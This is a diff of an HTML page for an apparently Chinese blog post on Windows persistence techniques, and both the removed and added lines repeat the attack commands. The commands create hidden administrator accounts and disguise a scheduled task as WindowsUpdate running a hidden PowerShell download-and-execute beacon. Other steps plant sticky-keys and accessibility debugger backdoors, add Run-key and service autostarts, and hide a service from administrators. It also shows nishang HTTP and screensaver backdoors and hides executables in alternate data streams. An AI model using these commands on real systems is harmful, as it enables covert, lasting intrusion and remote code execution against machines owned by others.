@@ -169,118 +169,146 @@ var _hmt = _hmt || [];
 #虽然使用 net user 是看不到这个账号的，但是在控制面板里可以看到，因此这种隐藏效果并不是很好
 net user teamssix$ Passw0rd &#x2F;add
 net localgroup administrators teamssix$ &#x2F;add<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
-<p><img src="/2023/10/28/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%89%8B%E6%B3%95/10/28/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%89%8B%E6%B3%95/image-20231029121500510.png" alt="image-20231029121500510"></p>
-<p><img src="/2023/10/28/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%89%8B%E6%B3%95/10/28/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%89%8B%E6%B3%95/image-20231029121535128.png" alt="image-20231029121535128"></p>
-<p>说明：想要更好的隐藏效果，可以通过注册表克隆用户实现，只是操作起来比较繁琐。teamssix师傅写的一个利用注册表创建隐藏用户的小工具可以快速实现这个功能【<a target="_blank" rel="noopener" href="https://github.com/wgpsec/CreateHiddenAccount】">https://github.com/wgpsec/CreateHiddenAccount】</a></p>
+
+<p><img src="/2023/10/28/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%89%8B%E6%B3%95/image-20231029121500510.png" alt="image-20231029121500510"></p>
+<p><img src="/2023/10/28/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%89%8B%E6%B3%95/image-20231029121535128.png" alt="image-20231029121535128"></p>
+<p>说明：想要更好的隐藏效果，可以通过注册表克隆用户实现，只是操作起来比较繁琐。teamssix师傅写的一个利用注册表创建隐藏用户的小工具可以快速实现这个功能【<a target="_blank" rel="noopener" href="https://github.com/wgpsec/CreateHiddenAccount%E3%80%91">https://github.com/wgpsec/CreateHiddenAccount】</a></p>
 <pre class="line-numbers language-none"><code class="language-none">#创建一个隐藏用户
 CreateHiddenAccount.exe -u teamssix -p Passw0rd
 #检查当前系统的隐藏账号
 CreateHiddenAccount.exe -c
 #删除用户
 CreateHiddenAccount.exe -d teamssix<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+
+
 <h2 id="2、计划任务"><a href="#2、计划任务" class="headerlink" title="2、计划任务"></a>2、计划任务</h2><p>说明：计划任务也是比较常见的权限维持方法，计划任务在 Win7 之前使用 at 命令，之后的系统中使用 schtasks 命令</p>
 <pre class="line-numbers language-none"><code class="language-none">#每小时执行一次calc.exe
 schtasks &#x2F;create &#x2F;tn updater &#x2F;tr calc.exe &#x2F;sc hourly &#x2F;mo 1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
-<p><img src="/2023/10/28/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%89%8B%E6%B3%95/10/28/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%89%8B%E6%B3%95/image-20231029122454235.png" alt="image-20231029122454235"></p>
+
+<p><img src="/2023/10/28/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%89%8B%E6%B3%95/image-20231029122454235.png" alt="image-20231029122454235"></p>
 <pre class="line-numbers language-none"><code class="language-none">#当系统空闲时，执行 CS 上线 PowerShell 脚本
 schtasks &#x2F;create &#x2F;tn WindowsUpdate &#x2F;tr &quot;powershell.exe -nop -w hidden -c &#39;IEX ((new-object net.webclient).downloadstring(&#39;&#39;&#39;http:&#x2F;&#x2F;172.16.214.1:80&#x2F;a&#39;&#39;&#39;))&#39;&quot; &#x2F;sc onidle &#x2F;i 1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
-<p><img src="/2023/10/28/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%89%8B%E6%B3%95/10/28/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%89%8B%E6%B3%95/image-20231029123133242.png" alt="image-20231029123133242"></p>
-<p><img src="/2023/10/28/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%89%8B%E6%B3%95/10/28/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%89%8B%E6%B3%95/image-20231029123204176.png" alt="image-20231029123204176"></p>
+
+<p><img src="/2023/10/28/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%89%8B%E6%B3%95/image-20231029123133242.png" alt="image-20231029123133242"></p>
+<p><img src="/2023/10/28/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%89%8B%E6%B3%95/image-20231029123204176.png" alt="image-20231029123204176"></p>
 <h2 id="3、shift后门"><a href="#3、shift后门" class="headerlink" title="3、shift后门"></a>3、shift后门</h2><pre class="line-numbers language-none"><code class="language-none">copy C:\Windows\System32\cmd.exe C:\Windows\System32\sethc.exe &#x2F;y<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<p><img src="/2023/10/28/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%89%8B%E6%B3%95/10/28/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%89%8B%E6%B3%95/image-20231029123912764.png" alt="image-20231029123912764"></p>
+
+<p><img src="/2023/10/28/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%89%8B%E6%B3%95/image-20231029123912764.png" alt="image-20231029123912764"></p>
 <pre class="line-numbers language-none"><code class="language-none">#如果提示访问被拒绝，可以在管理员权限下，加上 everyone 的权限再试试
 cacls C:\Windows\System32\sethc.exe  &#x2F;T &#x2F;E &#x2F;G everyone:F
 copy C:\Windows\System32\cmd.exe C:\Windows\System32\sethc.exe &#x2F;y<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
-<p><img src="/2023/10/28/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%89%8B%E6%B3%95/10/28/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%89%8B%E6%B3%95/image-20231029123416073.png" alt="image-20231029123416073"></p>
+
+<p><img src="/2023/10/28/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%89%8B%E6%B3%95/image-20231029123416073.png" alt="image-20231029123416073"></p>
 <pre class="line-numbers language-none"><code class="language-none">#也可以使用注册表
 REG ADD &quot;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe&quot; &#x2F;v Debugger &#x2F;t REG_SZ &#x2F;d &quot;C:\windows\system32\cmd.exe&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+
+
 <p>说明：在系统登录界面，按5下shift键就能打开cmd窗口，即粘滞键后门</p>
-<p><img src="/2023/10/28/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%89%8B%E6%B3%95/10/28/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%89%8B%E6%B3%95/image-20231029125825458.png" alt="image-20231029125825458"></p>
+<p><img src="/2023/10/28/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%89%8B%E6%B3%95/image-20231029125825458.png" alt="image-20231029125825458"></p>
 <p>补充：除了使用按5下shift 打开粘滞键的功能外，同样的道理，还可以使用辅助工具、放大镜、屏幕键盘等等</p>
 <pre class="line-numbers language-none"><code class="language-none">#这里演示使用辅助工具utilman.exe
 REG ADD &quot;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\utilman.exe&quot; &#x2F;t REG_SZ &#x2F;v Debugger &#x2F;d &quot;C:\windows\system32\cmd.exe&quot; &#x2F;f<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
-<p><img src="/2023/10/28/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%89%8B%E6%B3%95/10/28/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%89%8B%E6%B3%95/image-20231029141159902.png" alt="image-20231029141159902"></p>
-<p><img src="/2023/10/28/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%89%8B%E6%B3%95/10/28/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%89%8B%E6%B3%95/image-20231029141321051.png" alt="image-20231029141321051"></p>
-<p><img src="/2023/10/28/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%89%8B%E6%B3%95/10/28/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%89%8B%E6%B3%95/1642995681-882230-image.png" alt="img"></p>
+
+<p><img src="/2023/10/28/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%89%8B%E6%B3%95/image-20231029141159902.png" alt="image-20231029141159902"></p>
+<p><img src="/2023/10/28/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%89%8B%E6%B3%95/image-20231029141321051.png" alt="image-20231029141321051"></p>
+<p><img src="/2023/10/28/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%89%8B%E6%B3%95/1642995681-882230-image.png" alt="img"></p>
 <pre class="line-numbers language-none"><code class="language-none">#演示使用屏幕键盘osk.exe
 REG ADD &quot;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\osk.exe&quot; &#x2F;t REG_SZ &#x2F;v Debugger &#x2F;d &quot;C:\windows\system32\cmd.exe&quot; &#x2F;f<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
-<p><img src="/2023/10/28/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%89%8B%E6%B3%95/10/28/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%89%8B%E6%B3%95/image-20231029141628319.png" alt="image-20231029141628319"></p>
-<p><img src="/2023/10/28/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%89%8B%E6%B3%95/10/28/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%89%8B%E6%B3%95/1642995698-111867-image.png" alt="img"></p>
+
+<p><img src="/2023/10/28/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%89%8B%E6%B3%95/image-20231029141628319.png" alt="image-20231029141628319"></p>
+<p><img src="/2023/10/28/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%89%8B%E6%B3%95/1642995698-111867-image.png" alt="img"></p>
 <pre class="line-numbers language-none"><code class="language-none">#演示放大镜Magnify.exe
 REG ADD &quot;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\Magnify.exe&quot; &#x2F;t REG_SZ &#x2F;v Debugger &#x2F;d &quot;C:\windows\system32\cmd.exe&quot; &#x2F;f<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
-<p><img src="/2023/10/28/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%89%8B%E6%B3%95/10/28/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%89%8B%E6%B3%95/image-20231029142221757.png" alt="image-20231029142221757"></p>
-<p><img src="/2023/10/28/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%89%8B%E6%B3%95/10/28/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%89%8B%E6%B3%95/image-20231029142234592.png" alt="image-20231029142234592"></p>
-<p><img src="/2023/10/28/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%89%8B%E6%B3%95/10/28/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%89%8B%E6%B3%95/1642995711-431791-image.png" alt="img"></p>
+
+<p><img src="/2023/10/28/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%89%8B%E6%B3%95/image-20231029142221757.png" alt="image-20231029142221757"></p>
+<p><img src="/2023/10/28/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%89%8B%E6%B3%95/image-20231029142234592.png" alt="image-20231029142234592"></p>
+<p><img src="/2023/10/28/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%89%8B%E6%B3%95/1642995711-431791-image.png" alt="img"></p>
 <h2 id="4、组策略"><a href="#4、组策略" class="headerlink" title="4、组策略"></a>4、组策略</h2><p>流程：</p>
 <ol>
-<li>新建一个 bat 文件，这里 bat 内容遵循cmd/PowerShell语法，比如 calc</li>
+<li>新建一个 bat 文件，这里 bat 内容遵循cmd&#x2F;PowerShell语法，比如 calc</li>
 <li>进入本地组策略<ul>
 <li>终端中键入gpedit.msc</li>
 <li>win+R键入gpedit.msc</li>
 </ul>
 </li>
-<li>用户配置—&gt;Windows设置—&gt;脚本登录—&gt;选择 bat 文件【当用户登录时就会触发这个 bat 文件】</li>
+<li>用户配置–&gt;Windows设置–&gt;脚本登录–&gt;选择 bat 文件【当用户登录时就会触发这个 bat 文件】</li>
 </ol>
-<p><img src="/2023/10/28/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%89%8B%E6%B3%95/10/28/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%89%8B%E6%B3%95/1642995722-703721-image.png" alt="img"></p>
+<p><img src="/2023/10/28/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%89%8B%E6%B3%95/1642995722-703721-image.png" alt="img"></p>
 <h2 id="5、注册表"><a href="#5、注册表" class="headerlink" title="5、注册表"></a>5、注册表</h2><p>说明：在系统启动的注册表下添加恶意程序，这样当用户登录系统时，exe 就会被运行，或者将 exe 直接放到系统启动的文件夹里也是一样的道理</p>
 <pre class="line-numbers language-none"><code class="language-none">reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run &#x2F;v &quot;Vmware Regg&quot; &#x2F;t REG_SZ &#x2F;d &quot;C:\Windows\System32\calc.exe&quot; &#x2F;f<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<p><img src="/2023/10/28/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%89%8B%E6%B3%95/10/28/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%89%8B%E6%B3%95/image-20231029143436820.png" alt="image-20231029143436820"></p>
-<p><img src="/2023/10/28/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%89%8B%E6%B3%95/10/28/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%89%8B%E6%B3%95/image-20231029143510992.png" alt="image-20231029143510992"></p>
-<p><img src="/2023/10/28/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%89%8B%E6%B3%95/10/28/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%89%8B%E6%B3%95/1642995733-68515-image.png" alt="img"></p>
+
+<p><img src="/2023/10/28/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%89%8B%E6%B3%95/image-20231029143436820.png" alt="image-20231029143436820"></p>
+<p><img src="/2023/10/28/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%89%8B%E6%B3%95/image-20231029143510992.png" alt="image-20231029143510992"></p>
+<p><img src="/2023/10/28/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%89%8B%E6%B3%95/1642995733-68515-image.png" alt="img"></p>
 <h2 id="6、服务自启动"><a href="#6、服务自启动" class="headerlink" title="6、服务自启动"></a>6、服务自启动</h2><p>说明：直接使用命令创建服务</p>
 <pre class="line-numbers language-none"><code class="language-none">sc create teamssix start&#x3D;auto binPath&#x3D;&quot;cmd.exe &#x2F;k ping -n 1 test.xxx.ceye.io&quot; obj&#x3D;Localsystem<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<p><img src="/2023/10/28/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%89%8B%E6%B3%95/10/28/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%89%8B%E6%B3%95/image-20231029143646494.png" alt="image-20231029143646494"></p>
-<p><img src="/2023/10/28/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%89%8B%E6%B3%95/10/28/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%89%8B%E6%B3%95/image-20231029143652136.png" alt="image-20231029143652136"></p>
-<p><img src="/2023/10/28/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%89%8B%E6%B3%95/10/28/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%89%8B%E6%B3%95/image-20231029143704256.png" alt="image-20231029143704256"></p>
+
+<p><img src="/2023/10/28/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%89%8B%E6%B3%95/image-20231029143646494.png" alt="image-20231029143646494"></p>
+<p><img src="/2023/10/28/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%89%8B%E6%B3%95/image-20231029143652136.png" alt="image-20231029143652136"></p>
+<p><img src="/2023/10/28/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%89%8B%E6%B3%95/image-20231029143704256.png" alt="image-20231029143704256"></p>
 <pre class="line-numbers language-none"><code class="language-none">#启动该服务
 net start teamssix
 #可能会报错，但其实是被执行的<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
-<p><img src="/2023/10/28/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%89%8B%E6%B3%95/10/28/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%89%8B%E6%B3%95/1642995751-115259-image.png" alt="img"></p>
+
+<p><img src="/2023/10/28/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%89%8B%E6%B3%95/1642995751-115259-image.png" alt="img"></p>
 <p>注意：这种创建服务的方法隐藏性太弱，直接在服务里就能看到</p>
-<p><img src="/2023/10/28/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%89%8B%E6%B3%95/10/28/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%89%8B%E6%B3%95/1642995769-935072-image.png" alt="img"></p>
+<p><img src="/2023/10/28/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%89%8B%E6%B3%95/1642995769-935072-image.png" alt="img"></p>
 <p>可以在创建完服务后，使用以下命令将创建的服务隐藏，这样不论是在服务中，还是使用命令都查不到这个服务，如下</p>
 <pre class="line-numbers language-none"><code class="language-none">#隐藏服务
 sc.exe sdset teamssix &quot;D:(D;;DCLCWPDTSDCC;;;IU)(D;;DCLCWPDTSDCC;;;SU)(D;;DCLCWPDTSDCC;;;BA)(A;;CCLCSWLOCRRC;;;IU)(A;;CCLCSWLOCRRC;;;SU)(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)S:(AU;FA;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;WD)&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
-<p><img src="/2023/10/28/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%89%8B%E6%B3%95/10/28/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%89%8B%E6%B3%95/1642995779-915667-image.png" alt="img"></p>
+
+<p><img src="/2023/10/28/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%89%8B%E6%B3%95/1642995779-915667-image.png" alt="img"></p>
 <pre class="line-numbers language-none"><code class="language-none">#可以使用以下命令恢复
 &amp; $env:SystemRoot\System32\sc.exe sdset teamssix &quot;D:(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)(A;;CCLCSWLOCRRC;;;IU)(A;;CCLCSWLOCRRC;;;SU)S:(AU;FA;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;WD)&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
-<h2 id="7、nishang后门"><a href="#7、nishang后门" class="headerlink" title="7、nishang后门"></a>7、nishang后门</h2><p>说明：nishang 是一个 PowerShell 项目，里面集成了众多工具，其中包含有制作后门的工具【<a target="_blank" rel="noopener" href="https://github.com/samratashok/nishang】">https://github.com/samratashok/nishang】</a></p>
+
+
+
+<h2 id="7、nishang后门"><a href="#7、nishang后门" class="headerlink" title="7、nishang后门"></a>7、nishang后门</h2><p>说明：nishang 是一个 PowerShell 项目，里面集成了众多工具，其中包含有制作后门的工具【<a target="_blank" rel="noopener" href="https://github.com/samratashok/nishang%E3%80%91">https://github.com/samratashok/nishang】</a></p>
 <h3 id="HTTP-Backdoor"><a href="#HTTP-Backdoor" class="headerlink" title="HTTP-Backdoor"></a>HTTP-Backdoor</h3><pre class="line-numbers language-none"><code class="language-none">cd nishang\Backdoors
 Import-Module .\HTTP-Backdoor.ps1
 HTTP-Backdoor -CheckURL http:&#x2F;&#x2F;192.168.7.1&#x2F;1.txt -PayloadURL http:&#x2F;&#x2F;192.168.7.1&#x2F;calc.ps1 -MagicString start -StopString stop<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
-<p><img src="/2023/10/28/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%89%8B%E6%B3%95/10/28/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%89%8B%E6%B3%95/image-20231029150732405.png" alt="image-20231029150732405"></p>
+
+<p><img src="/2023/10/28/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%89%8B%E6%B3%95/image-20231029150732405.png" alt="image-20231029150732405"></p>
 <p><code>说明：该脚本会读取 CheckURL 的内容，这里设置的 MagicString 为 start，即当 http://192.168.7.1/1.txt 内容为 start 的时候，就会执行 http://192.168.7.1/calc.ps1 脚本</code></p>
-<p><img src="/2023/10/28/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%89%8B%E6%B3%95/10/28/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%89%8B%E6%B3%95/1642995787-819963-image.png" alt="img"></p>
+<p><img src="/2023/10/28/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%89%8B%E6%B3%95/1642995787-819963-image.png" alt="img"></p>
 <h3 id="Add-ScrnSaveBackdoor"><a href="#Add-ScrnSaveBackdoor" class="headerlink" title="Add-ScrnSaveBackdoor"></a>Add-ScrnSaveBackdoor</h3><p>说明：Add-ScrnSaveBackdoor 脚本可以帮助攻击者利用 Windows 的屏幕保护程序来安装一个隐藏的后门，该脚本需要管理员权限</p>
 <pre class="line-numbers language-none"><code class="language-none">Import-Module .\Add-ScrnSaveBackdoor.ps1
 Add-ScrnSaveBackdoor -Payload &quot;Powershell.exe calc&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
-<p><img src="/2023/10/28/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%89%8B%E6%B3%95/10/28/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%89%8B%E6%B3%95/1642995798-424517-image.png" alt="img"></p>
+
+<p><img src="/2023/10/28/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%89%8B%E6%B3%95/1642995798-424517-image.png" alt="img"></p>
 <p>当屏幕保护程序启动时，就会运行 Payload 里的内容</p>
-<p><img src="/2023/10/28/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%89%8B%E6%B3%95/10/28/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%89%8B%E6%B3%95/1642995806-737528-image.png" alt="img"></p>
+<p><img src="/2023/10/28/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%89%8B%E6%B3%95/1642995806-737528-image.png" alt="img"></p>
 <p>除了上面的两个脚本外，还有 Execute-OnTime 和 Invoke-ADSBackdoor。其中 Execute-OnTime 和 HTTP-Backdoor 脚本的使用方法相似，不过增加了定时启动脚本的功能。Windows 下的制作后门方法当然不止上面这些，还有其他的，比如进程注入、dll 劫持等等。</p>
 <h1 id="Windows文件隐藏"><a href="#Windows文件隐藏" class="headerlink" title="Windows文件隐藏"></a>Windows文件隐藏</h1><h2 id="1、文件属性"><a href="#1、文件属性" class="headerlink" title="1、文件属性"></a>1、文件属性</h2><p>说明：文件右击属性，选择隐藏即可</p>
-<p><img src="/2023/10/28/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%89%8B%E6%B3%95/10/28/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%89%8B%E6%B3%95/1642995815-443214-image.png" alt="img"></p>
+<p><img src="/2023/10/28/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%89%8B%E6%B3%95/1642995815-443214-image.png" alt="img"></p>
 <p>如果想显示文件，就在文件夹选择中选择「显示隐藏的文件、文件夹和驱动器」就行了</p>
-<p><img src="/2023/10/28/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%89%8B%E6%B3%95/10/28/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%89%8B%E6%B3%95/1642995824-299239-image.png" alt="img"></p>
+<p><img src="/2023/10/28/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%89%8B%E6%B3%95/1642995824-299239-image.png" alt="img"></p>
 <p>也可以键入如下命令</p>
 <pre class="line-numbers language-none"><code class="language-none">attrib +s +a +h +r <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<p><img src="/2023/10/28/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%89%8B%E6%B3%95/10/28/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%89%8B%E6%B3%95/1642995831-613157-image.png" alt="img"></p>
+
+<p><img src="/2023/10/28/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%89%8B%E6%B3%95/1642995831-613157-image.png" alt="img"></p>
 <h2 id="2、ADS"><a href="#2、ADS" class="headerlink" title="2、ADS"></a>2、ADS</h2><p>说明：ADS是NTFS磁盘格式的一个特性，在NTFS文件系统下，每个文件都可以存在多个数据流，创建一个数据交换流文件的方法很简单，命令为“宿主文件:准备与宿主文件关联的数据流文件”。</p>
 <pre class="line-numbers language-none"><code class="language-none">echo teamssix &gt; CreateHiddenAccount_v0.2.exe:test.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<p>使用 dir 是看不到的，使用 dir /r 才可以</p>
-<p><img src="/2023/10/28/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%89%8B%E6%B3%95/10/28/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%89%8B%E6%B3%95/1642995857-995048-image.png" alt="img"></p>
+
+<p>使用 dir 是看不到的，使用 dir &#x2F;r 才可以</p>
+<p><img src="/2023/10/28/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%89%8B%E6%B3%95/1642995857-995048-image.png" alt="img"></p>
 <p>如果想编辑该文件，可以使用 notepad 进行编辑</p>
-<p><img src="/2023/10/28/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%89%8B%E6%B3%95/10/28/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%89%8B%E6%B3%95/1642995865-198699-image.png" alt="img"></p>
+<p><img src="/2023/10/28/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%89%8B%E6%B3%95/1642995865-198699-image.png" alt="img"></p>
 <p>如果想执行 exe 文件，可以先创建一个快捷方式，再执行</p>
 <pre class="line-numbers language-none"><code class="language-none">type evil.exe &gt; CreateHiddenAccount_v0.2.exe:evil.exe
 #需要管理员权限
 mklink &quot;C:\Users\test\Desktop\evillink.exe&quot; &quot;C:\Users\test\Desktop\CreateHiddenAccount_v0.2.exe:evil.exe&quot;
 start evil.exe
 #如果想删除这个隐藏文件，需要删除宿主文件才行<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+
+
 <h2 id="3、系统文件夹伪装"><a href="#3、系统文件夹伪装" class="headerlink" title="3、系统文件夹伪装"></a>3、系统文件夹伪装</h2><p>例如这里有一个 test 文件夹，将 test 命名为：我的电脑.{20D04FE0-3AEA-1069-A2D8-08002B30309D}，这时文件夹的图标就会变为「我的电脑」图标</p>
-<p><img src="/2023/10/28/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%89%8B%E6%B3%95/10/28/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%89%8B%E6%B3%95/1642995875-275666-image.png" alt="img"></p>
+<p><img src="/2023/10/28/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%89%8B%E6%B3%95/1642995875-275666-image.png" alt="img"></p>
 <p>使用 dir 可以看到里面的文件，但如果点击这个文件夹，就会真的进入到「我的电脑」界面里</p>
-<p><img src="/2023/10/28/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%89%8B%E6%B3%95/10/28/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%89%8B%E6%B3%95/1642995882-883710-image.png" alt="img"></p>
+<p><img src="/2023/10/28/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%89%8B%E6%B3%95/1642995882-883710-image.png" alt="img"></p>
 <p>下面是一些其他的常用标识符</p>
 <pre class="line-numbers language-none"><code class="language-none">上帝模式.&#123;ED7BA470-8E54-465E-825C-99712043E01C&#125;
 CLSIDexcel.&#123;00020810-0000-0000-C000-000000000046&#125;
